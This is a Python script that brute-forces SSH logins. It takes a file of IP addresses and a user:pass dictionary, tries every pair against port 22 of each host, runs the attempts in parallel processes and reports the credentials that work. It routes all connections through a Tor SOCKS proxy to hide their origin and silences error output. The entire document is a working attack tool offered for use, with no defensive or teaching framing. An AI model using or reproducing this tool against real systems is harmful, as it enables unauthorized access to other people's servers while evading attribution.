#!/usr/bin/env python3
import paramiko
import sys
import time
import multiprocessing
import socket
import socks

_s = sys.stderr
sys.stderr = open('/dev/null', 'w')

class Attempt(object):
    def __init__(self, ip, username, password, lock_for_log):
        self.lock_for_log = lock_for_log

        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            # ssh.connect('localhost',username=name,password=pw,allow_agent=False,look_for_keys=False)
            ssh.connect(hostname=ip, port=22, username=username, password=password, allow_agent=False,look_for_keys=False, timeout=5)
        except paramiko.AuthenticationException:
            self.log('[-] {} - {}:{} fail!'.format(ip, username, password))
        except socket.error:
            self.log('[-] {} - {}:{} fail!'.format(ip, username, password))
        else:
            self.log('[+] {} - {}:{} is CORRECT!'.format(ip, username, password))
        ssh.close()

    def log(self, message):
        with self.lock_for_log:
            print(message)

if __name__ == '__main__':

    if len(sys.argv) != 3:
        print('Usage: {} /path/to/ip_list /path/to/dictionary'.format(str(sys.argv[0])))
        print('Example: {} ip_list.txt dictionary.txt'.format(str(sys.argv[0])))
        print('Dictionary should be in user:pass format')
        sys.exit(1)

    print('[!] Bruteforcing')

    script_filename, ip_list_filename, dictionary_filename = sys.argv

    with open(ip_list_filename) as f:
        ip_list = f.read().splitlines()

    with open(dictionary_filename) as f:
        dictionary = f.read().splitlines()

    lock_for_log = multiprocessing.Lock()

    for ip in ip_list:
        ip = ip.strip()

        for line in dictionary:
            username, password = line.strip().split(':')
            t = multiprocessing.Process(target=Attempt, args=(ip, username, password, lock_for_log))
            t.start()
            time.sleep(0.4)

    sys.exit(0)
